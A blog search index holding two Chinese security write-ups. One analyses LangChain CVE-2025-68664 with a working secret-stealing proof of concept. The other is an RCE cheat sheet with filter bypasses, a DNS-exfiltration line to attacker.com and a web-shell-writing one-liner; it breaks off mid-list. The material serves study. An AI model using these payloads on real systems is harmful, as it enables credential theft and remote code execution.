<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>langchain序列化注入-CVE-2025-68664</title>
      <link href="/2026/01/03/cve-2025-68664/"/>
      <url>/2026/01/03/cve-2025-68664/</url>
      
        <content type="html"><![CDATA[<h1 id="langchain序列化-CVE-2025-68664"><a href="#langchain序列化-CVE-2025-68664" class="headerlink" title="langchain序列化 CVE-2025-68664"></a>langchain序列化 CVE-2025-68664</h1><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p><code>langchain-core</code> &lt; 0.3.81</p><p><code>langchain-core</code> &gt;&#x3D; 1.0.0 且 &lt; 1.2.5</p><h3 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h3><p>具体位于这里</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> langchain_core.load <span class="keyword">import</span> dumps, dumpd, load, loads</span><br></pre></td></tr></table></figure><p><code>dumps()</code>与<code>dumpd()</code>函数在处理字典对象时没有对<code>lc</code>这个键进行转义</p><p>这个键属于内部保留键，如果用户手动添加这个键值，就能伪造成内部的操作</p><p>实现窃取环境变量等操作</p><h3 id="调试分析-源码逻辑"><a href="#调试分析-源码逻辑" class="headerlink" title="调试分析&#x2F;源码逻辑"></a>调试分析&#x2F;源码逻辑</h3><p>从loads开始调试</p><p>可以清楚的看到经过<code>dumpd()</code>函数的字典中的<code>lc</code>键并没有被转义</p><p><img src="/2026/01/03/cve-2025-68664/1.png"></p><p>步入进<code>beta()</code>装饰器，这个不重要，在<code>return</code>回外部时步入即可</p><p>进入<code>loads()</code>函数本身：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@beta()</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">loads</span>(<span class="params"></span></span><br><span class="line"><span class="params">    text: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    *,</span></span><br><span class="line"><span class="params">    secrets_map: <span class="type">Optional</span>[<span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    valid_namespaces: <span class="type">Optional</span>[<span class="built_in">list</span>[<span class="built_in">str</span>]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    secrets_from_env: <span class="built_in">bool</span> = <span class="literal">True</span>,</span></span><br><span class="line"><span class="params">    additional_import_mappings: <span class="type">Optional</span>[<span class="built_in">dict</span>[<span class="built_in">tuple</span>[<span class="built_in">str</span>, ...], <span class="built_in">tuple</span>[<span class="built_in">str</span>, ...]]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    ignore_unserializable_fields: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="type">Any</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> json.loads(</span><br><span class="line">        text,</span><br><span class="line">        object_hook=Reviver(</span><br><span class="line">            secrets_map,</span><br><span class="line">            valid_namespaces,</span><br><span class="line">            secrets_from_env,</span><br><span class="line">            additional_import_mappings,</span><br><span class="line">            ignore_unserializable_fields=ignore_unserializable_fields,</span><br><span class="line">        ),</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p><code>loads</code>函数中是一个<code>json.loads</code>函数的操作</p><p>第一个参数代表需要加载成<code>json</code>（字典）的<code>json</code>格式字符串，</p><p>第二个<code>object_hook</code>是一个可执行对象，会接收text转换出的j<code>json</code>对象并进行处理</p><p>可以简单写一个脚本测试一下这个过程：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">obj_text = <span class="string">&quot;&#123;\&quot;a\&quot;: 123, \&quot;b\&quot;: 1234&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a, b</span>):</span><br><span class="line">        <span class="variable language_">self</span>.a = a</span><br><span class="line">        <span class="variable language_">self</span>.b = b</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;&lt;Test a=<span class="subst">&#123;self.a&#125;</span> b=<span class="subst">&#123;self.b&#125;</span>&gt;&quot;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user_decoder</span>(<span class="params">d</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">in</span> d <span class="keyword">and</span> <span class="string">&#x27;b&#x27;</span> <span class="keyword">in</span> d:</span><br><span class="line">        <span class="keyword">return</span> Test(d[<span class="string">&#x27;a&#x27;</span>], d[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(json.loads(obj_text,object_hook=user_decoder))</span><br><span class="line"><span class="comment"># &lt;Test a=123 b=1234&gt;</span></span><br></pre></td></tr></table></figure><p>不过注意<code>object_hook</code>需要是一个可执行对象，而不是只能是函数</p><p>所以传入实现了<code>__call__</code>魔术方法的类的实例化对象，</p><p>或实现了<code>__init__</code>构造函数的类都是可行的</p><p>所以回到<code>loads</code>函数中的这一段代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> json.loads(</span><br><span class="line">    text,</span><br><span class="line">    object_hook=Reviver(</span><br><span class="line">        secrets_map,</span><br><span class="line">        valid_namespaces,</span><br><span class="line">        secrets_from_env,</span><br><span class="line">        additional_import_mappings,</span><br><span class="line">        ignore_unserializable_fields=ignore_unserializable_fields,</span><br><span class="line">    ),</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>这里已经主动实例化了<code>Reviver</code>的对象，</p><p>所以<code>object_hook</code>实际上是<code>Reviver</code>的<code>__call__</code>方法，</p><p>我们步入<code>json.loads</code>的过程之间也可以看到这个方法：</p><p><img src="/2026/01/03/cve-2025-68664/2.png"></p><p>经过<code>Reviver</code>的过程后我们原本的字典对象就直接变为了读取出来的环境变量：</p><p><img src="/2026/01/03/cve-2025-68664/3.png"></p><p>我们直接在需要看的<code>__call__</code>方法的位置下断点</p><p>就成功找到了在环境变量中读取的过程了：</p><p><img src="/2026/01/03/cve-2025-68664/4.png"></p><p><img src="/2026/01/03/cve-2025-68664/5.png"></p><p><img src="/2026/01/03/cve-2025-68664/6.png"></p><p>此处的<code>os.environ</code>包含了python程序运行时从系统环境变量中拷贝过来的变量</p><p>还有在程序中手动设置的变量</p><p>再完整看一下源码，逻辑还是很好懂的：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">self, value: <span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>]</span>) -&gt; <span class="type">Any</span>:</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        value.get(<span class="string">&quot;lc&quot;</span>) == <span class="number">1</span></span><br><span class="line">        <span class="keyword">and</span> value.get(<span class="string">&quot;type&quot;</span>) == <span class="string">&quot;secret&quot;</span></span><br><span class="line">        <span class="keyword">and</span> value.get(<span class="string">&quot;id&quot;</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line">    ):</span><br><span class="line">        [key] = value[<span class="string">&quot;id&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">in</span> <span class="variable language_">self</span>.secrets_map:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.secrets_map[key]</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.secrets_from_env <span class="keyword">and</span> key <span class="keyword">in</span> os.environ <span class="keyword">and</span> os.environ[key]:</span><br><span class="line">            <span class="keyword">return</span> os.environ[key]</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        value.get(<span class="string">&quot;lc&quot;</span>) == <span class="number">1</span></span><br><span class="line">        <span class="keyword">and</span> value.get(<span class="string">&quot;type&quot;</span>) == <span class="string">&quot;not_implemented&quot;</span></span><br><span class="line">        <span class="keyword">and</span> value.get(<span class="string">&quot;id&quot;</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line">    ):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.ignore_unserializable_fields:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        msg = (</span><br><span class="line">            <span class="string">&quot;Trying to load an object that doesn&#x27;t implement &quot;</span></span><br><span class="line">            <span class="string">f&quot;serialization: <span class="subst">&#123;value&#125;</span>&quot;</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError(msg)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        value.get(<span class="string">&quot;lc&quot;</span>) == <span class="number">1</span></span><br><span class="line">        <span class="keyword">and</span> value.get(<span class="string">&quot;type&quot;</span>) == <span class="string">&quot;constructor&quot;</span></span><br><span class="line">        <span class="keyword">and</span> value.get(<span class="string">&quot;id&quot;</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line">    ):</span><br><span class="line">        [*namespace, name] = value[<span class="string">&quot;id&quot;</span>]</span><br><span class="line">        mapping_key = <span class="built_in">tuple</span>(value[<span class="string">&quot;id&quot;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            namespace[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> <span class="variable language_">self</span>.valid_namespaces</span><br><span class="line">            <span class="comment"># The root namespace [&quot;langchain&quot;] is not a valid identifier.</span></span><br><span class="line">            <span class="keyword">or</span> namespace == [<span class="string">&quot;langchain&quot;</span>]</span><br><span class="line">        ):</span><br><span class="line">            msg = <span class="string">f&quot;Invalid namespace: <span class="subst">&#123;value&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">raise</span> ValueError(msg)</span><br><span class="line">        <span class="comment"># Has explicit import path.</span></span><br><span class="line">        <span class="keyword">if</span> mapping_key <span class="keyword">in</span> <span class="variable language_">self</span>.import_mappings:</span><br><span class="line">            import_path = <span class="variable language_">self</span>.import_mappings[mapping_key]</span><br><span class="line">            <span class="comment"># Split into module and name</span></span><br><span class="line">            import_dir, name = import_path[:-<span class="number">1</span>], import_path[-<span class="number">1</span>]</span><br><span class="line">            <span class="comment"># Import module</span></span><br><span class="line">            mod = importlib.import_module(<span class="string">&quot;.&quot;</span>.join(import_dir))</span><br><span class="line">        <span class="keyword">elif</span> namespace[<span class="number">0</span>] <span class="keyword">in</span> DISALLOW_LOAD_FROM_PATH:</span><br><span class="line">            msg = (</span><br><span class="line">                <span class="string">&quot;Trying to deserialize something that cannot &quot;</span></span><br><span class="line">                <span class="string">&quot;be deserialized in current version of langchain-core: &quot;</span></span><br><span class="line">                <span class="string">f&quot;<span class="subst">&#123;mapping_key&#125;</span>.&quot;</span></span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">raise</span> ValueError(msg)</span><br><span class="line">        <span class="comment"># Otherwise, treat namespace as path.</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            mod = importlib.import_module(<span class="string">&quot;.&quot;</span>.join(namespace))</span><br><span class="line"></span><br><span class="line">        cls = <span class="built_in">getattr</span>(mod, name)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># The class must be a subclass of Serializable.</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">issubclass</span>(cls, Serializable):</span><br><span class="line">            msg = <span class="string">f&quot;Invalid namespace: <span class="subst">&#123;value&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">raise</span> ValueError(msg)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># We don&#x27;t need to recurse on kwargs</span></span><br><span class="line">        <span class="comment"># as json.loads will do that for us.</span></span><br><span class="line">        kwargs = value.get(<span class="string">&quot;kwargs&quot;</span>, &#123;&#125;)</span><br><span class="line">        <span class="keyword">return</span> cls(**kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> value</span><br></pre></td></tr></table></figure><p>注意到还有两个我们没有使用过的<code>type</code></p><p>其中<code>not_implemented</code>是用作容错的，没有什么作用</p><p>而<code>constructor</code>就相等有意思了，可以实例化<code>langchain</code>白名单中的类</p><p>白名单默认为这些：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">DEFAULT_NAMESPACES = [</span><br><span class="line">    <span class="string">&quot;langchain&quot;</span>,</span><br><span class="line">    <span class="string">&quot;langchain_core&quot;</span>,</span><br><span class="line">    <span class="string">&quot;langchain_community&quot;</span>,</span><br><span class="line">    <span class="string">&quot;langchain_anthropic&quot;</span>,</span><br><span class="line">    <span class="string">&quot;langchain_groq&quot;</span>,</span><br><span class="line">    <span class="string">&quot;langchain_google_genai&quot;</span>,</span><br><span class="line">    <span class="string">&quot;langchain_aws&quot;</span>,</span><br><span class="line">    <span class="string">&quot;langchain_openai&quot;</span>,</span><br><span class="line">    <span class="string">&quot;langchain_google_vertexai&quot;</span>,</span><br><span class="line">    <span class="string">&quot;langchain_mistralai&quot;</span>,</span><br><span class="line">    <span class="string">&quot;langchain_fireworks&quot;</span>,</span><br><span class="line">    <span class="string">&quot;langchain_xai&quot;</span>,</span><br><span class="line">    <span class="string">&quot;langchain_sambanova&quot;</span>,</span><br><span class="line">    <span class="string">&quot;langchain_perplexity&quot;</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>最好用的是<code>langchain_community</code>,里面有大量的工具可以执行代码，读取文件，打SSRF等</p><p>可惜的是他在黑名单里：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">DISALLOW_LOAD_FROM_PATH = [</span><br><span class="line">    <span class="string">&quot;langchain_community&quot;</span>,</span><br><span class="line">    <span class="string">&quot;langchain&quot;</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>别的利用可能稍微有限些，例如如果想要利用<code>langchain_openai</code>打<code>ssrf</code></p><p>构造payload：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;lc&quot;</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="string">&quot;type&quot;</span>: <span class="string">&quot;constructor&quot;</span>,</span><br><span class="line">  <span class="string">&quot;id&quot;</span>: [<span class="string">&quot;langchain_openai&quot;</span>, <span class="string">&quot;chat_models&quot;</span>, <span class="string">&quot;base&quot;</span>, <span class="string">&quot;ChatOpenAI&quot;</span>],</span><br><span class="line">  <span class="string">&quot;kwargs&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;openai_api_key&quot;</span>: <span class="string">&quot;sk-ssrf-test-key&quot;</span>,</span><br><span class="line">    <span class="string">&quot;base_url&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span>,</span><br><span class="line">    <span class="string">&quot;max_retries&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;temperature&quot;</span>: <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实例化的过程不触发请求，</p><p>而是需要目标服务中额外调用<code>langchain_openai</code>实例化对象的<code>invoke</code>方法</p><p>肯定不会主动写这种逻辑的：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">restored_obj = loads(json_str)</span><br><span class="line">response = restored_obj.invoke(<span class="string">&quot;Hello, are you there?&quot;</span>)</span><br></pre></td></tr></table></figure><p>不过如果确实这么写了是能收到请求&#x2F;响应</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">en</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>404 Not Found<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Not Found<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 - - [03/Jan/2026 19:14:40] &quot;POST /chat/completions HTTP/1.1&quot; 404 -</span><br></pre></td></tr></table></figure><h3 id="实际场景复现"><a href="#实际场景复现" class="headerlink" title="实际场景复现"></a>实际场景复现</h3><p>在这个漏洞的实际利用中，我们肯定没法直接调用目标服务的<code>loads</code>函数</p><p>取决于不同服务何时主动调用loads</p><p>例如这个服务：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI, HTTPException</span><br><span class="line"><span class="keyword">from</span> pydantic <span class="keyword">import</span> BaseModel</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Any</span>, <span class="type">Dict</span>, <span class="type">List</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> langchain_core.messages <span class="keyword">import</span> HumanMessage, AIMessage</span><br><span class="line"><span class="keyword">from</span> langchain_core.load <span class="keyword">import</span> dumpd, load</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line">DB_FILE = <span class="string">&quot;chat_history.json&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(DB_FILE):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(DB_FILE, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        json.dump([], f)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChatInput</span>(<span class="title class_ inherited__">BaseModel</span>):</span><br><span class="line">    message: <span class="built_in">str</span></span><br><span class="line">    metadata: <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>] = &#123;&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/send_message&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_message</span>(<span class="params">chat_input: ChatInput</span>):</span><br><span class="line">    msg = HumanMessage(content=chat_input.message, additional_kwargs=chat_input.metadata)</span><br><span class="line">    </span><br><span class="line">    serialized_msg = dumpd(msg)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(DB_FILE, <span class="string">&quot;r+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        history = json.load(f)</span><br><span class="line">        history.append(serialized_msg)</span><br><span class="line">        f.seek(<span class="number">0</span>)</span><br><span class="line">        json.dump(history, f)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;Message saved&quot;</span>, <span class="string">&quot;serialized_data&quot;</span>: serialized_msg&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/get_history&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_history</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(DB_FILE, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            history_data = json.load(f)</span><br><span class="line">        </span><br><span class="line">        restored_messages = []</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> history_data:</span><br><span class="line">            obj = load(item) </span><br><span class="line">            restored_messages.append(obj)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;history&quot;</span>: <span class="built_in">str</span>(restored_messages)&#125;</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;error&quot;</span>: <span class="built_in">str</span>(e), <span class="string">&quot;message&quot;</span>: <span class="string">&quot;反序列化失败&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">os.environ[<span class="string">&quot;API_SECRET&quot;</span>] = <span class="string">&quot;Flag&#123;Real_World_Attack_Success&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">import</span> uvicorn</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 服务端启动中...&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 目标机密: API_SECRET&quot;</span>)</span><br><span class="line">    uvicorn.run(app, host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>我们可以就可以利用刚刚的漏洞编写出这个poc完成攻击</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8000/send_message&quot;</span></span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;message&quot;</span>: <span class="string">&quot;你好，这是一条普通的消息&quot;</span>,</span><br><span class="line">    <span class="string">&quot;metadata&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;my_hack&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;lc&quot;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;type&quot;</span>: <span class="string">&quot;secret&quot;</span>,</span><br><span class="line">            <span class="string">&quot;id&quot;</span>: [<span class="string">&quot;API_SECRET&quot;</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 1. 发送恶意消息 (埋雷)...&quot;</span>)</span><br><span class="line">response = requests.post(url, json=payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;服务器响应: <span class="subst">&#123;response.json()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n[*] 2. 触发读取历史 (引爆)...&quot;</span>)</span><br><span class="line">trigger_url = <span class="string">&quot;http://127.0.0.1:8000/get_history&quot;</span></span><br><span class="line">trigger_response = requests.get(trigger_url)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[-] 服务器返回的历史记录:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(trigger_response.text)</span><br></pre></td></tr></table></figure><p><img src="/2026/01/03/cve-2025-68664/7.png"></p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve </tag>
            
            <tag> python </tag>
            
            <tag> ai </tag>
            
            <tag> langchain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE补课</title>
      <link href="/2026/01/01/rce-plus/"/>
      <url>/2026/01/01/rce-plus/</url>
      
        <content type="html"><![CDATA[<h1 id="RCE补课"><a href="#RCE补课" class="headerlink" title="RCE补课"></a>RCE补课</h1><h1 id="linux-shell"><a href="#linux-shell" class="headerlink" title="linux shell"></a>linux shell</h1><h3 id="解析命令的过程"><a href="#解析命令的过程" class="headerlink" title="解析命令的过程"></a>解析命令的过程</h3><p>遵循“一切皆字符串原则”，除去特殊符号的作用外，一都认为是字符串，没有别的数据类型</p><p>如果出现特殊符号，例如通配符，或者变量，则会全部替换成字符串，再进入shell解析</p><p>例如:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> flag</span><br></pre></td></tr></table></figure><p>这句命令中的 <code>cat</code> 和 <code>flag</code>，事实上都被认为是字符串</p><p>然后shell通过空格将参数分隔</p><p>第一个位置的参数必须是命令（可执行文件路径、内置命令、函数）</p><p>后面的所有位置都作为传递给命令的参数</p><h3 id="特殊符号与特殊变量"><a href="#特殊符号与特殊变量" class="headerlink" title="特殊符号与特殊变量"></a>特殊符号与特殊变量</h3><h5 id="命令链接符"><a href="#命令链接符" class="headerlink" title="命令链接符"></a>命令链接符</h5><p><code>;</code> 和 <code>||</code> 无论成败都继续执行: <code>ping 127.0.0.1; cat /flag</code></p><p><code>&amp;&amp;</code> 与运算，仅成功时执行，可以用来盲注：<code>mkdir test &amp;&amp; cd test</code></p><h5 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h5><p><code>*</code> (星号)：匹配 任意长度 的任意字符。<br><code>?</code> (问号)：匹配 单个 任意字符。<br><code>[]</code>：匹配括号内的 任意一个 字符。<code>cat /fla[e-h]</code><br><code>&#123;&#125;</code> 扩展生成，<code>cp config.php&#123;,.bak&#125;</code> -&gt; 等效于 <code>cp config.php config.php.bak</code></p><p>在某些 Shell 中，<code>&#123;cat,/flag&#125;</code> 可以像命令一样执行，利用逗号代替空格。</p><h5 id="动态执行"><a href="#动态执行" class="headerlink" title="动态执行"></a>动态执行</h5><p><code>`</code> (反引号)：</p><ul><li>作用： 执行引号内的命令，并将输出结果替换到当前位置。</li><li>例子： <code>echo &quot;Current user is </code>whoami<code>&quot;</code> -&gt; 输出 <code>Current user is root</code></li><li>CTF 技巧： 这是最古老的命令替换方式。如果 <code>$()</code> 被过滤，就用它。</li></ul><p><code>$(...)</code> (Dollar + 括号)：</p><ul><li>作用： 同反引号，但支持嵌套，更现代化。</li><li>例子： <code>ping $(whoami).attacker.com</code> -&gt; 利用 DNS 携带数据外带 (OOB)。</li></ul><p><code>$var</code> &#x2F; <code>$&#123;var&#125;</code> (变量)：</p><ul><li>作用： 调用变量。</li><li>CTF 技巧 (空变量绕过)： <code>c$&#123;u&#125;at /flag</code> (假设 u 变量不存在，也就是空)，Shell 解析后变成 <code>cat /flag</code>。这可以绕过对关键字 “cat” 的检测。</li></ul><h5 id="尖括号大全"><a href="#尖括号大全" class="headerlink" title="尖括号大全"></a>尖括号大全</h5><p><code>&gt;</code> 覆盖写入</p><p><code>&gt;&gt;</code> 追加写入</p><p><code>&lt;</code> 控制输入，例如：<code>cat&lt;/flag</code>，等价于 <code>cat /flag</code></p><p><code>&lt;&lt;</code> 嵌入文档：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 把换行后直到EOF的所有内容，一次性喂给 cat，相当于读取了有次内容的文档，然后写入 file.txt</span></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt;<span class="string">EOF &gt; file.txt</span></span><br><span class="line"><span class="string">Line 1: Hello</span></span><br><span class="line"><span class="string">Line 2: World</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure><p><code>&lt;&lt;&lt;</code> 字符串输入：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 方式 A (常用，但需要管道符)：</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;password&quot;</span> | grep <span class="string">&quot;pass&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 方式 B (使用三个尖括号，不需要管道符)：</span></span><br><span class="line">grep <span class="string">&quot;pass&quot;</span> &lt;&lt;&lt; <span class="string">&quot;password&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CTF 场景：Base64 解码写入文件（不使用 | ）</span></span><br><span class="line"><span class="built_in">base64</span> -d &lt;&lt;&lt; <span class="string">&quot;PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==&quot;</span> &gt; shell.php</span><br></pre></td></tr></table></figure><h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><p><code>#</code> 注释</p><p><code>!!</code> 执行上条命令</p><p><code>!$</code> 引用上一条命令的最后一个参数</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /var/www/html/extremely/long/path/</span><br><span class="line"><span class="built_in">cd</span> !$ </span><br><span class="line"><span class="comment"># 这里的 !$ 自动变成了那个长路径</span></span><br></pre></td></tr></table></figure><p><code>--</code> 参数结束标记</p><h1 id="绕过关键字或符号"><a href="#绕过关键字或符号" class="headerlink" title="绕过关键字或符号"></a>绕过关键字或符号</h1><h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><p>常用于关键字过滤，实际上linux读取文件有许多方法</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. cat - 最常用的连接文件并打印</span></span><br><span class="line"><span class="comment"># 如果 &quot;cat&quot; 关键字被过滤，可以使用绝对路径 /bin/cat 或单引号 ca&#x27;&#x27;t 绕过</span></span><br><span class="line"><span class="built_in">cat</span> /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. tac - 反向 cat (Reverse cat)</span></span><br><span class="line"><span class="comment"># 按行反向输出文件内容（最后一行显示在最上面），对于只有一行的 flag 效果等同于 cat</span></span><br><span class="line"><span class="built_in">tac</span> /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. more - 分页显示</span></span><br><span class="line"><span class="comment"># 通常用于长文件，但在脚本执行或只有一行内容时，它会直接输出内容</span></span><br><span class="line">more 